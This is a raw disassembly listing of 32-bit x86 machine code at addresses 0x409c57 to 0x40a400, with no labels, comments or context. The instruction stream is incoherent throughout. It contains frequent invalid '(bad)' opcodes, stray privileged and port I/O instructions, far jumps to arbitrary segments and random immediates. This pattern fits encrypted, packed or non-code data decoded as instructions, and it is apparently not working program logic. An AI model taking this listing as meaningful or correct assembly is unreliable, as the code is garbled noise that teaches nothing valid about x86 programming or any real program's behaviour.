  409c57:	sbb    DWORD PTR [eax],0xffffffa5
  409c5a:	pop    es
  409c5b:	sub    esi,edx
  409c5d:	(bad)  
  409c5e:	mov    ebx,0xcfac4f76
  409c63:	imul   edi,DWORD PTR [eax-0x63],0xffffffab
  409c67:	es ins BYTE PTR es:[edi],dx
  409c69:	inc    esp
  409c6a:	push   0x27
  409c6c:	add    al,BYTE PTR [ebp+0x4402e725]
  409c72:	mov    cl,0x34
  409c74:	sbb    eax,DWORD PTR [ebx]
  409c76:	ss or  al,0xf6
  409c79:	push   edx
  409c7a:	mov    BYTE PTR [edi+0x754593eb],dl
  409c80:	xchg   ebp,eax
  409c81:	js     0x409cec
  409c83:	(bad)  
  409c84:	shr    ebx,1
  409c86:	lea    edx,[ecx+0x7e]
  409c89:	add    eax,0x8138c524
  409c8e:	popf   
  409c8f:	push   0x5db99457
  409c94:	push   0x7133b21d
  409c99:	cli    
  409c9a:	(bad)  
  409c9b:	inc    DWORD PTR [ebx+0x3e2b1b03]
  409ca1:	int    0x2f
  409ca3:	and    dh,BYTE PTR [edi]
  409ca5:	sbb    DWORD PTR [ecx],esi
  409ca7:	xor    eax,0x5f0e24c7
  409cac:	pop    ebx
  409cad:	fistp  DWORD PTR [ecx+ebp*4+0x356988ed]
  409cb4:	mov    bl,0x42
  409cb6:	pusha  
  409cb7:	repz fwait
  409cb9:	xchg   edx,eax
  409cba:	mov    BYTE PTR [ebx],bl
  409cbc:	aad    0x6c
  409cbe:	gs mov ch,0x80
  409cc1:	out    0x5c,al
  409cc3:	jmp    0x6196724
  409cc8:	fcom   DWORD PTR [ecx+0x44]
  409ccb:	mov    BYTE PTR [eax],bh
  409ccd:	(bad)  
  409cce:	mov    ebx,0x88d18a2
  409cd3:	push   es
  409cd4:	clc    
  409cd5:	dec    ebp
  409cd6:	mov    ch,0xc1
  409cd8:	cmp    dh,bl
  409cda:	jmp    0xb09f:0x1fc279f5
  409ce1:	and    eax,0x9811beee
  409ce6:	push   ss
  409ce7:	out    dx,eax
  409ce8:	adc    eax,0xe7a04888
  409ced:	mov    cl,bl
  409cef:	in     eax,dx
  409cf0:	cli    
  409cf1:	push   0x24
  409cf3:	xchg   ebx,eax
  409cf4:	or     al,al
  409cf6:	call   0xcc52:0x716f0dcd
  409cfd:	mul    DWORD PTR [edi-0x19]
  409d00:	(bad)  
  409d01:	hlt    
  409d02:	outs   dx,BYTE PTR ds:[esi]
  409d03:	test   al,0xae
  409d05:	mov    ebp,0xfb0146dc
  409d0a:	mov    ebp,0xa51f3a74
  409d0f:	das    
  409d10:	push   edi
  409d11:	mov    ch,0xb7
  409d13:	xchg   edi,eax
  409d14:	cmp    cl,BYTE PTR [bp+0x14]
  409d18:	neg    cl
  409d1a:	fwait
  409d1b:	mov    esp,0x2cea9f8a
  409d20:	sub    ah,BYTE PTR [esi]
  409d22:	loope  0x409cba
  409d24:	sub    ebx,DWORD PTR [ebx-0x5acd30d7]
  409d2a:	mov    ebp,0xd933d25d
  409d2f:	mov    ds:0xb15be8c3,eax
  409d34:	pop    esi
  409d35:	mov    edx,0x338a2c0f
  409d3a:	add    al,0x2d
  409d3c:	call   0xb19b:0x6b8556ae
  409d43:	out    0x9e,al
  409d45:	or     dl,BYTE PTR ds:0x68dfdb33
  409d4b:	pushf  
  409d4c:	xchg   edx,eax
  409d4d:	jle    0x409cdd
  409d4f:	or     BYTE PTR [esi+0x0],al
  409d52:	and    edx,edx
  409d54:	imul   esp,DWORD PTR [esi-0xab6fc58],0x1e007fde
  409d5e:	mov    edx,0x8647426
  409d63:	(bad)  
  409d64:	int3   
  409d65:	sti    
  409d66:	nop
  409d67:	dec    ebp
  409d68:	inc    eax
  409d69:	in     al,0xe1
  409d6b:	outs   dx,BYTE PTR ds:[esi]
  409d6c:	mov    esi,0xcd9f410a
  409d71:	pusha  
  409d72:	mov    fs,WORD PTR [edx-0x47ea1991]
  409d78:	dec    eax
  409d79:	fisttp QWORD PTR [esi+0x52]
  409d7c:	rol    DWORD PTR [eax+0x33],cl
  409d7f:	mov    esp,0x711d27d2
  409d84:	aas    
  409d85:	add    al,0x4b
  409d87:	fyl2x  
  409d89:	call   0x9aaa93ca
  409d8e:	dec    ecx
  409d8f:	jnp    0x409d6b
  409d91:	pop    eax
  409d92:	stc    
  409d93:	push   es
  409d94:	sbb    dl,BYTE PTR [ebp-0x67]
  409d97:	fmul   st(2),st
  409d99:	xor    eax,0xe7b53def
  409d9e:	ja     0x409da9
  409da0:	(bad)  
  409da1:	jg     0x409d39
  409da3:	les    esi,FWORD PTR [edi-0x6f]
  409da6:	jecxz  0x409e27
  409da8:	scas   eax,DWORD PTR es:[edi]
  409da9:	and    al,BYTE PTR [edx]
  409dab:	ja     0x409d9a
  409dad:	ret    
  409dae:	adc    al,0xbb
  409db0:	imul   ecx,edi,0x3d
  409db3:	dec    edi
  409db4:	(bad)  
  409db5:	mov    cl,0x5
  409db7:	(bad)  
  409db8:	popf   
  409db9:	gs lahf 
  409dbb:	jne    0x409def
  409dbd:	push   ds
  409dbe:	out    dx,eax
  409dbf:	dec    edi
  409dc0:	nop
  409dc1:	les    eax,FWORD PTR [esi]
  409dc3:	xor    ch,ah
  409dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dc6:	cmp    dl,BYTE PTR [esi+ebx*8+0x92d0b25]
  409dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dce:	xlat   BYTE PTR ds:[ebx]
  409dcf:	pop    ecx
  409dd0:	jne    0x409e2b
  409dd2:	adc    BYTE PTR [ebp-0x50],cl
  409dd5:	test   DWORD PTR [eax],0x1f467d87
  409ddb:	mov    al,ds:0x76ef83f5
  409de0:	add    dh,ah
  409de2:	aad    0xcb
  409de4:	sub    eax,0x1013ea79
  409de9:	adc    esp,DWORD PTR [ebx+0x1dc89214]
  409def:	sub    dh,BYTE PTR [ebx]
  409df1:	nop
  409df2:	repz out 0xd6,eax
  409df5:	(bad)  
  409df6:	cld    
  409df7:	xor    cl,BYTE PTR [eax+0xff2654b]
  409dfd:	mov    BYTE PTR [ebx+0x1b],bl
  409e00:	add    eax,0x77e8a1cf
  409e05:	je     0x409de7
  409e07:	and    BYTE PTR [ecx+ebx*1-0x56],ah
  409e0b:	xor    al,0xd8
  409e0d:	mov    gs,WORD PTR [edx-0x516177df]
  409e13:	test   eax,0x30105951
  409e18:	push   es
  409e19:	mov    esp,0x1465ebf1
  409e1e:	shr    BYTE PTR [ebx-0x7b],0x94
  409e22:	pop    eax
  409e23:	daa    
  409e24:	add    al,0xd9
  409e26:	inc    ecx
  409e27:	inc    edi
  409e28:	sahf   
  409e29:	add    bl,0x5a
  409e2c:	cmp    BYTE PTR [ebp+0x2145366f],al
  409e32:	xchg   edi,eax
  409e33:	and    bh,BYTE PTR [eax]
  409e35:	mov    edi,0x7eb3b52a
  409e3a:	add    DWORD PTR [ebx-0xa6536c0],esi
  409e40:	jno    0x409e0a
  409e42:	clc    
  409e43:	adc    ch,ah
  409e45:	xor    al,0x1b
  409e47:	test   eax,0xf0853390
  409e4c:	ret    
  409e4d:	jo     0x409dfe
  409e4f:	out    dx,eax
  409e50:	cmp    edx,DWORD PTR [esi-0x2d4997e2]
  409e56:	xchg   esp,eax
  409e57:	push   esi
  409e58:	dec    ebp
  409e59:	adc    BYTE PTR [esi+0x396941f2],ah
  409e5f:	test   DWORD PTR [esi],esi
  409e61:	call   DWORD PTR ds:0xac11fc18
  409e67:	(bad)  
  409e68:	inc    edx
  409e69:	ret    0xd3b
  409e6c:	mov    ch,0xb3
  409e6e:	fistp  WORD PTR [eax-0x6c835266]
  409e74:	repz pop es
  409e76:	shl    BYTE PTR [ebx+ebp*4+0x513f90d2],0x6f
  409e7e:	test   BYTE PTR [ebx-0x65e2947e],cl
  409e84:	cmp    eax,0xcb550de
  409e89:	xor    eax,0xe4082f1c
  409e8e:	retf   
  409e8f:	call   0x769:0x768e4fb6
  409e96:	aaa    
  409e97:	xor    edi,ecx
  409e99:	jecxz  0x409e45
  409e9b:	mov    ch,0xce
  409e9d:	pop    ds
  409e9e:	and    eax,0x56cb2373
  409ea3:	popa   
  409ea4:	inc    eax
  409ea5:	mov    ebp,0x87f800db
  409eaa:	mul    bh
  409eac:	icebp  
  409ead:	imul   edi,DWORD PTR [edi],0x74
  409eb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eb1:	out    dx,eax
  409eb2:	lods   al,BYTE PTR ds:[esi]
  409eb3:	mov    bl,0x24
  409eb5:	stos   BYTE PTR es:[edi],al
  409eb6:	pushf  
  409eb7:	push   es
  409eb8:	mov    ebp,0x4fd9a3dd
  409ebd:	retf   0x18df
  409ec0:	retf   0xe257
  409ec3:	daa    
  409ec4:	sub    eax,0xa418954d
  409ec9:	int    0x23
  409ecb:	jne    0x409f07
  409ecd:	pop    ebx
  409ece:	add    al,BYTE PTR [ebp+0x6f78de88]
  409ed4:	jg     0x409ee8
  409ed6:	mov    dh,0xfc
  409ed8:	jo     0x409f1a
  409eda:	dec    esi
  409edb:	enter  0x473,0x98
  409edf:	enter  0x6e1,0xcc
  409ee3:	or     al,0x2e
  409ee5:	jmp    DWORD PTR [ebx]
  409ee7:	cmp    ebp,ebp
  409ee9:	rol    BYTE PTR [edx+0x71d886d4],cl
  409eef:	push   edx
  409ef0:	push   eax
  409ef1:	dec    ecx
  409ef2:	(bad)  
  409ef3:	es (bad) 
  409ef6:	mov    ebx,DWORD PTR [ebx]
  409ef8:	enter  0x2450,0x54
  409efc:	jns    0x409f63
  409efe:	sbb    esi,edx
  409f00:	(bad)  
  409f01:	pusha  
  409f02:	adc    al,0xee
  409f04:	push   ds
  409f05:	inc    eax
  409f06:	dec    edx
  409f07:	xchg   esp,eax
  409f08:	pushf  
  409f09:	in     eax,dx
  409f0a:	cwde   
  409f0b:	aad    0xc2
  409f0d:	sub    eax,0x7374f4c2
  409f12:	adc    ebp,esp
  409f14:	mov    ch,0x5d
  409f16:	pop    ebp
  409f17:	inc    edx
  409f18:	dec    ebp
  409f19:	out    dx,eax
  409f1a:	mov    edx,0xfaf59fe4
  409f1f:	into   
  409f20:	stos   BYTE PTR es:[edi],al
  409f21:	add    edi,DWORD PTR [edx-0x460da0c6]
  409f27:	rcl    BYTE PTR [ecx+0x6b],cl
  409f2a:	les    ecx,FWORD PTR [ebx+0x1b]
  409f2d:	stos   DWORD PTR es:[edi],eax
  409f2e:	sahf   
  409f2f:	pop    eax
  409f30:	jecxz  0x409f12
  409f32:	jnp    0x409f87
  409f34:	jg     0x409ed2
  409f36:	jno    0x409f94
  409f38:	dec    ecx
  409f39:	lahf   
  409f3a:	dec    esi
  409f3b:	jno    0x409ec0
  409f3d:	pop    es
  409f3e:	call   0xd9b9a05f
  409f43:	adc    ch,BYTE PTR [edx]
  409f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f46:	xchg   edx,eax
  409f47:	inc    DWORD PTR [edi-0x11]
  409f4a:	mov    ds:0xc6f0172a,eax
  409f4f:	call   0x7b50:0x1aef92e4
  409f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f57:	mov    DWORD PTR [eax+ebx*2+0x52645e61],edi
  409f5e:	lea    edi,[edx+ecx*1-0x74]
  409f62:	test   BYTE PTR [eax],dh
  409f64:	std    
  409f65:	mov    cl,dh
  409f67:	(bad)  
  409f68:	inc    ecx
  409f69:	and    edx,DWORD PTR [eax-0x76]
  409f6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f6d:	add    al,0x98
  409f6f:	data16 arpl WORD PTR [edx-0xc],bp
  409f73:	dec    ebx
  409f74:	popf   
  409f75:	push   edx
  409f76:	loope  0x409f78
  409f78:	adc    ebp,DWORD PTR [eax-0x1c495a87]
  409f7e:	adc    al,0x4f
  409f80:	push   es
  409f81:	ss pop ebx
  409f83:	ins    DWORD PTR es:[edi],dx
  409f84:	std    
  409f85:	and    eax,0x19f4ed5f
  409f8a:	xor    DWORD PTR [ecx+0x54],eax
  409f8d:	add    al,0x87
  409f8f:	outs   dx,BYTE PTR ds:[esi]
  409f90:	mov    bh,0x7f
  409f92:	or     BYTE PTR [edi+0x70],0xb0
  409f96:	ret    0xe407
  409f99:	or     DWORD PTR [eax],edi
  409f9b:	arpl   bp,ax
  409f9d:	mov    esp,0x70818972
  409fa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fa3:	stos   BYTE PTR es:[edi],al
  409fa4:	aad    0x70
  409fa6:	lds    eax,FWORD PTR [eax-0x6b]
  409fa9:	in     eax,dx
  409faa:	lahf   
  409fab:	mov    dl,0xa6
  409fad:	ret    0x6422
  409fb0:	jmp    0x7a89:0xdace8ec8
  409fb7:	sbb    edx,DWORD PTR [edi-0x74b6679e]
  409fbd:	add    BYTE PTR [ecx+0x377afec7],bh
  409fc3:	sti    
  409fc4:	cmp    ebp,DWORD PTR [ecx+0x11a8454e]
  409fca:	pop    es
  409fcb:	aas    
  409fcc:	push   cs
  409fcd:	inc    edi
  409fce:	fild   QWORD PTR [esi+0x42]
  409fd1:	addr16 mov edx,0x5ae96df
  409fd7:	lahf   
  409fd8:	and    eax,0x89051c58
  409fdd:	in     al,0x24
  409fdf:	cmp    BYTE PTR [eax-0x15a4a231],bh
  409fe5:	adc    al,0xe2
  409fe7:	daa    
  409fe8:	jns    0x40a03e
  409fea:	jns    0x409fbd
  409fec:	test   DWORD PTR [edi-0x31921ffe],ebx
  409ff2:	mov    ds:0x3d56426b,eax
  409ff7:	push   ebx
  409ff8:	add    al,BYTE PTR [edi-0x4c]
  409ffb:	xchg   esi,eax
  409ffc:	add    DWORD PTR [eax*2-0x73a1fb93],ecx
  40a003:	pop    ebp
  40a004:	aam    0x6e
  40a006:	and    ebp,DWORD PTR [ebp-0x287d6ff4]
  40a00c:	call   DWORD PTR [ebx+0xb]
  40a00f:	int    0xb8
  40a011:	fcomp  DWORD PTR [ecx+0x54]
  40a014:	fdiv   st(5),st
  40a016:	fisttp QWORD PTR ds:0x336eb425
  40a01c:	mov    edx,DWORD PTR [ebp-0x76]
  40a01f:	mov    al,0xb9
  40a021:	xlat   BYTE PTR ds:[ebx]
  40a022:	cmp    BYTE PTR [esi-0x2095b18f],cl
  40a028:	inc    ebx
  40a029:	adc    ebp,DWORD PTR [esi+ebx*2-0x6c251d82]
  40a030:	inc    esi
  40a031:	(bad)  
  40a032:	leave  
  40a033:	push   eax
  40a034:	jmp    0x6b9:0xeee13c59
  40a03b:	sbb    al,0x34
  40a03d:	fdiv   DWORD PTR [edi]
  40a03f:	sub    dh,al
  40a041:	(bad)  
  40a042:	js     0x40a02b
  40a044:	push   ebp
  40a045:	ret    
  40a046:	push   es
  40a047:	leave  
  40a048:	cwde   
  40a049:	cli    
  40a04a:	daa    
  40a04b:	scas   al,BYTE PTR es:[edi]
  40a04c:	leave  
  40a04d:	retf   0x10c8
  40a050:	into   
  40a051:	int3   
  40a052:	(bad)  
  40a054:	jno    0x40a0d4
  40a056:	loopne 0x40a084
  40a058:	mov    edi,ecx
  40a05a:	mov    eax,0x8d7dabc4
  40a05f:	nop
  40a060:	xchg   esi,eax
  40a061:	and    al,0x80
  40a064:	mov    ds:0x3a0f145f,eax
  40a069:	es xchg ecx,eax
  40a06b:	rcr    ebp,cl
  40a06d:	or     eax,0x7b02190c
  40a072:	inc    ebp
  40a073:	aaa    
  40a074:	into   
  40a075:	cmp    edi,DWORD PTR [edx]
  40a077:	lock dec ebx
  40a079:	inc    edx
  40a07a:	fidivr WORD PTR [esi-0x5a]
  40a07d:	fld    TBYTE PTR [ecx+esi*1]
  40a080:	mov    ebx,0xac2ca041
  40a085:	adc    DWORD PTR [eax-0x7c],edi
  40a088:	sar    BYTE PTR [edi],cl
  40a08a:	push   esp
  40a08b:	(bad)  
  40a08c:	(bad)  
  40a08d:	dec    edx
  40a08e:	idiv   BYTE PTR [ecx+0x58]
  40a091:	jne    0x40a020
  40a093:	add    eax,0x9fb4943
  40a098:	daa    
  40a099:	sbb    bh,BYTE PTR [edi]
  40a09b:	jle    0x40a0dc
  40a09d:	cld    
  40a09e:	cli    
  40a09f:	fs xchg bh,ch
  40a0a2:	sub    DWORD PTR [esp+edx*2-0x43],eax
  40a0a6:	xchg   ecx,eax
  40a0a7:	nop
  40a0a8:	cmp    DWORD PTR [ebp+0x4b7886cb],ebp
  40a0ae:	add    al,0xc1
  40a0b0:	sbb    ecx,DWORD PTR [eax-0x3ee8385e]
  40a0b6:	or     BYTE PTR [esi-0x23],bh
  40a0b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0ba:	sub    DWORD PTR [ecx+0x44e10a31],esp
  40a0c0:	push   ebx
  40a0c1:	ss dec ecx
  40a0c3:	outs   dx,DWORD PTR ds:[esi]
  40a0c4:	sbb    eax,0x10
  40a0c7:	in     al,0xc
  40a0c9:	popf   
  40a0ca:	in     eax,0x1a
  40a0cc:	sete   BYTE PTR [ecx]
  40a0cf:	jg     0x40a076
  40a0d1:	in     al,dx
  40a0d2:	stos   DWORD PTR es:[edi],eax
  40a0d3:	sub    eax,0xdaf43ceb
  40a0d8:	cs loop 0x40a0be
  40a0db:	sbb    al,0x13
  40a0dd:	jecxz  0x40a070
  40a0df:	push   es
  40a0e0:	cdq    
  40a0e1:	or     ebp,DWORD PTR [eax-0x432b542f]
  40a0e7:	mov    al,ds:0xbf140744
  40a0ec:	rcr    BYTE PTR [ebx-0x3a],1
  40a0ef:	xor    eax,0xb1bd1808
  40a0f4:	out    dx,eax
  40a0f5:	jae    0x40a0cc
  40a0f7:	cs push ss
  40a0f9:	outs   dx,DWORD PTR ds:[esi]
  40a0fa:	xor    DWORD PTR [edx-0x6ae38299],0xffffffa7
  40a101:	mov    edi,0x3c42ef2e
  40a106:	scas   al,BYTE PTR es:[edi]
  40a107:	lahf   
  40a108:	icebp  
  40a109:	adc    eax,0x80ca4d05
  40a10e:	push   0x78b237bb
  40a113:	shr    ch,0xf0
  40a116:	ins    BYTE PTR es:[edi],dx
  40a117:	aad    0x2f
  40a119:	sahf   
  40a11a:	ret    0xc851
  40a11d:	cwde   
  40a11e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a11f:	imul   ebx,DWORD PTR [edi],0xe8ce1e7d
  40a125:	xor    bl,BYTE PTR [esp+edx*2]
  40a128:	mul    ecx
  40a12a:	int    0xcd
  40a12c:	test   BYTE PTR [esi],al
  40a12e:	fisubr WORD PTR [ebx-0x6f]
  40a131:	push   esi
  40a132:	jmp    0x9a23:0xe68b8db5
  40a139:	jl     0x40a0f9
  40a13b:	int    0x78
  40a13d:	xor    eax,0xa7d6185a
  40a142:	and    BYTE PTR [ebx],bl
  40a144:	out    dx,al
  40a145:	add    BYTE PTR [eax],0xef
  40a148:	cmp    ebp,DWORD PTR [esi]
  40a14a:	leave  
  40a14b:	push   ebp
  40a14c:	fadd   QWORD PTR [ebp-0x736687c6]
  40a152:	xor    ebp,ecx
  40a154:	jge    0x40a197
  40a156:	push   ebx
  40a157:	mov    bh,0xe1
  40a159:	in     al,dx
  40a15a:	pusha  
  40a15b:	or     DWORD PTR [eax+0x20],esi
  40a15e:	inc    ebx
  40a15f:	iret   
  40a160:	das    
  40a161:	test   eax,0xd403070c
  40a166:	into   
  40a167:	test   eax,0xe6510ce5
  40a16c:	fbstp  TBYTE PTR [edi]
  40a16e:	sahf   
  40a16f:	push   edx
  40a170:	les    edx,FWORD PTR [esi-0x66fdc96]
  40a176:	adc    edx,DWORD PTR [eax]
  40a178:	sub    bl,BYTE PTR [ecx-0x45]
  40a17b:	cdq    
  40a17c:	push   ds
  40a17d:	aad    0x67
  40a17f:	(bad)  [ecx+0x4279a7c7]
  40a185:	push   ebp
  40a186:	hlt    
  40a187:	dec    edi
  40a188:	call   0x39d10f31
  40a18d:	xchg   DWORD PTR [edi+0x140e642d],esp
  40a193:	sub    esi,edi
  40a195:	jecxz  0x40a1a8
  40a197:	iret   
  40a198:	ds mov edi,0x28210bbb
  40a19e:	(bad)  
  40a19f:	(bad)  
  40a1a0:	js     0x40a18f
  40a1a2:	mov    ch,0xdc
  40a1a4:	dec    edi
  40a1a5:	mov    dh,0xd5
  40a1a7:	scas   al,BYTE PTR es:[edi]
  40a1a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1a9:	pop    ds
  40a1aa:	and    ecx,esi
  40a1ac:	jae    0x40a180
  40a1ae:	jge    0x40a168
  40a1b0:	test   eax,0xef483a47
  40a1b5:	pop    es
  40a1b6:	lods   al,BYTE PTR ds:[esi]
  40a1b7:	pop    ss
  40a1b8:	jecxz  0x40a1d1
  40a1ba:	je     0x40a1c4
  40a1bc:	gs pop ds
  40a1be:	sub    eax,edi
  40a1c0:	push   esp
  40a1c1:	dec    ebx
  40a1c2:	in     eax,dx
  40a1c3:	mov    BYTE PTR [edx+0x74],cl
  40a1c6:	out    0x87,eax
  40a1c8:	lods   eax,DWORD PTR ds:[esi]
  40a1c9:	pop    ds
  40a1ca:	ficom  DWORD PTR [ecx+0x19bb7550]
  40a1d0:	mov    al,ds:0x545959d2
  40a1d5:	mov    ch,0xf1
  40a1d7:	lahf   
  40a1d8:	imul   esp
  40a1da:	sub    eax,0x23ccebe2
  40a1df:	jns    0x40a171
  40a1e1:	imul   edi,DWORD PTR [ecx-0x5b],0xae9e730
  40a1e8:	imul   eax,DWORD PTR [ebp-0x64],0x4b37e1e6
  40a1ef:	xchg   BYTE PTR [edi],dh
  40a1f1:	adc    DWORD PTR [edx-0x51],eax
  40a1f4:	ss ret 0xcfe4
  40a1f8:	jo     0x40a1d5
  40a1fa:	xchg   esi,eax
  40a1fb:	ficomp DWORD PTR [esi-0x4231143c]
  40a201:	jae    0x40a260
  40a203:	pop    esp
  40a204:	adc    BYTE PTR [esi-0x6859998c],ch
  40a20a:	sbb    ecx,DWORD PTR [ecx+0xed9f5ef]
  40a210:	cmp    DWORD PTR [ebp+0x2e],eax
  40a213:	shr    ebp,0xb0
  40a216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a217:	pop    ebp
  40a218:	mov    ebx,0x5fa19db9
  40a21d:	jae    0x40a209
  40a21f:	iret   
  40a220:	pop    es
  40a221:	cmp    esp,DWORD PTR [edx]
  40a223:	mul    DWORD PTR ds:0x6f2dcc8d
  40a229:	and    cl,ah
  40a22b:	cli    
  40a22c:	(bad)  
  40a22d:	cmc    
  40a22e:	sbb    al,0xdc
  40a230:	iret   
  40a231:	arpl   WORD PTR [eax+0x76],cx
  40a234:	(bad)  
  40a235:	pop    ecx
  40a236:	call   0xa8f0:0xd2180fec
  40a23d:	add    bl,BYTE PTR [ebp+0x2d98fb9]
  40a243:	sbb    al,0xc1
  40a245:	in     eax,0x6a
  40a247:	or     BYTE PTR [ebx+0x6cdea5ef],dh
  40a24d:	lods   eax,DWORD PTR ds:[esi]
  40a24e:	je     0x40a2c2
  40a250:	or     al,0x53
  40a252:	add    al,0x7d
  40a254:	jb     0x40a24f
  40a256:	push   eax
  40a257:	into   
  40a258:	outs   dx,DWORD PTR ds:[esi]
  40a259:	es pop ebx
  40a25b:	out    0xbe,al
  40a25d:	imul   edx,DWORD PTR [ebx+0xc],0xfffffff9
  40a261:	imul   esi
  40a263:	mov    eax,0x5d086fe5
  40a268:	dec    esp
  40a269:	xor    al,0x8e
  40a26b:	jge    0x40a1f7
  40a26d:	mov    al,0x55
  40a26f:	and    DWORD PTR [edi-0x65],ebp
  40a272:	fwait
  40a273:	and    ebp,DWORD PTR [ecx+eax*8]
  40a276:	repnz lock pop esp
  40a279:	adc    BYTE PTR [esi-0x1b7874e7],0xf0
  40a280:	(bad)  
  40a281:	int3   
  40a282:	ss inc ebx
  40a284:	(bad)  
  40a285:	lahf   
  40a286:	mov    WORD PTR [ecx+0x14],fs
  40a289:	mov    al,ds:0x6d396d8f
  40a28e:	les    eax,FWORD PTR [ebx]
  40a290:	mov    WORD PTR [eax],?
  40a292:	in     eax,0x44
  40a294:	test   cl,al
  40a296:	xchg   esp,eax
  40a297:	pop    ebx
  40a298:	pop    ss
  40a299:	pop    edi
  40a29a:	mov    ?,WORD PTR [edx*1+0x88cc4d9]
  40a2a1:	inc    edx
  40a2a2:	mov    dh,dl
  40a2a4:	add    cl,BYTE PTR [edi-0x4c]
  40a2a7:	pop    eax
  40a2a8:	retf   0x47ba
  40a2ab:	dec    ecx
  40a2ac:	popa   
  40a2ad:	int    0xbd
  40a2af:	fxch   st(2)
  40a2b1:	retf   
  40a2b2:	mov    ds:0xdf3484f3,al
  40a2b7:	jmp    0x40a319
  40a2b9:	call   0x5254039d
  40a2be:	mov    ah,0x3c
  40a2c0:	or     DWORD PTR [esi-0x6],ebp
  40a2c3:	sbb    DWORD PTR [ebx],ecx
  40a2c5:	push   ebp
  40a2c6:	pusha  
  40a2c7:	adc    al,0x3c
  40a2c9:	sbb    BYTE PTR ds:0xa05308ff,dl
  40a2cf:	pop    esp
  40a2d0:	jmp    0x2467:0x1350def2
  40a2d7:	jg     0x40a337
  40a2d9:	icebp  
  40a2da:	lods   al,BYTE PTR ds:[esi]
  40a2db:	and    DWORD PTR [esi-0x3e],esi
  40a2de:	test   BYTE PTR [edi-0x221c9c97],dl
  40a2e4:	les    eax,FWORD PTR [esi-0x15e1dd48]
  40a2ea:	sbb    edx,esi
  40a2ec:	sbb    ebx,edx
  40a2ee:	xor    eax,0xc4564650
  40a2f3:	sub    eax,0x33bb602c
  40a2f8:	bound  eax,QWORD PTR [esi+0x1d]
  40a2fb:	jg     0x40a2a7
  40a2fd:	(bad)  
  40a2fe:	mov    DWORD PTR [esi],ebx
  40a300:	sbb    DWORD PTR [eax-0x49],0xec231a64
  40a307:	mov    ebp,0xefa169af
  40a30c:	mov    ebp,0x7cda8e7f
  40a311:	das    
  40a312:	pop    ecx
  40a313:	jg     0x40a307
  40a315:	ja     0x40a384
  40a317:	xor    eax,0x5a7cccf3
  40a31c:	cmp    ecx,DWORD PTR [eax-0x539534e8]
  40a322:	inc    edx
  40a323:	pop    edx
  40a324:	popa   
  40a325:	pop    ecx
  40a326:	inc    edx
  40a327:	addr16 jbe 0x40a2af
  40a32a:	inc    edx
  40a32b:	mov    ch,BYTE PTR [edi+0x6e]
  40a32e:	pop    ecx
  40a32f:	in     al,dx
  40a330:	(bad)  
  40a331:	dec    edi
  40a332:	into   
  40a333:	mov    ebp,0x986217c8
  40a338:	loop   0x40a3a9
  40a33a:	sbb    dl,BYTE PTR [edx-0x7d]
  40a33d:	and    DWORD PTR [ebp+0x5],esp
  40a340:	out    0x9f,eax
  40a342:	or     ecx,DWORD PTR [edx-0x24e5bb15]
  40a348:	inc    ebx
  40a349:	sub    al,0x9a
  40a34b:	lahf   
  40a34c:	rcpps  xmm1,xmm6
  40a34f:	pop    edx
  40a350:	mov    ah,0x59
  40a352:	jmp    0x6a7f:0x1395c06
  40a359:	sub    dl,BYTE PTR [ecx+0x25]
  40a35c:	adc    eax,0x67f886c4
  40a361:	add    DWORD PTR [ebx+eax*1+0x908dc5d],ebp
  40a368:	mov    BYTE PTR [bp+di+0x7c4b],dl
  40a36d:	and    ebx,DWORD PTR [ecx]
  40a36f:	push   ebx
  40a370:	xchg   ecx,eax
  40a371:	or     BYTE PTR [eax-0x77017a98],0x41
  40a378:	xor    DWORD PTR [ebx+0x1b],edx
  40a37b:	pop    eax
  40a37c:	int3   
  40a37d:	dec    edx
  40a37e:	mov    DWORD PTR [ecx-0x63],ebp
  40a381:	ss int3 
  40a383:	dec    ecx
  40a384:	jae    0x40a364
  40a386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a387:	rcr    DWORD PTR [edi-0x1845ceaf],0x51
  40a38e:	lds    ebp,FWORD PTR [ebx]
  40a390:	mov    cl,0x66
  40a392:	mov    ds:0xab10f98e,al
  40a397:	ins    DWORD PTR es:[edi],dx
  40a398:	dec    esp
  40a399:	xchg   ebp,eax
  40a39a:	jl     0x40a40b
  40a39c:	into   
  40a39d:	lods   al,BYTE PTR ds:[esi]
  40a39e:	jl     0x40a3db
  40a3a0:	pop    esi
  40a3a1:	mov    ebp,DWORD PTR [edi]
  40a3a3:	pop    ss
  40a3a4:	xlat   BYTE PTR ds:[ebx]
  40a3a5:	sub    esi,DWORD PTR [ecx]
  40a3a7:	xchg   esp,eax
  40a3a8:	pop    ebp
  40a3a9:	dec    ebp
  40a3aa:	arpl   WORD PTR [ebx-0x7a075a02],si
  40a3b0:	popa   
  40a3b1:	push   ss
  40a3b2:	ret    0x5061
  40a3b5:	mov    bl,BYTE PTR [edi+0x2b85150a]
  40a3bb:	imul   ebp,DWORD PTR [ecx-0x14f071ef],0xa7051e41
  40a3c5:	dec    esi
  40a3c6:	sbb    bl,bh
  40a3c8:	sbb    al,0xb1
  40a3ca:	or     ch,dl
  40a3cc:	hlt    
  40a3cd:	test   al,0xb5
  40a3cf:	(bad)  
  40a3d0:	outs   dx,BYTE PTR ds:[esi]
  40a3d1:	pop    ss
  40a3d2:	cmp    eax,0x955ebb4e
  40a3d7:	push   esp
  40a3d8:	sbb    DWORD PTR [ecx+0x67e205a3],ebp
  40a3de:	call   0xe5d44e01
  40a3e3:	sbb    DWORD PTR [eax+0x58f77499],ebp
  40a3e9:	scas   eax,DWORD PTR es:[edi]
  40a3ea:	dec    edx
  40a3eb:	retf   0xf12d
  40a3ee:	pop    ss
  40a3ef:	push   esp
  40a3f0:	mov    dl,0x16
  40a3f2:	inc    BYTE PTR [edx+0x6e]
  40a3f5:	dec    edx
  40a3f6:	mov    ecx,0x22ee4857
  40a3fb:	cmp    eax,0x40c9700c
  40a400:	push   cs
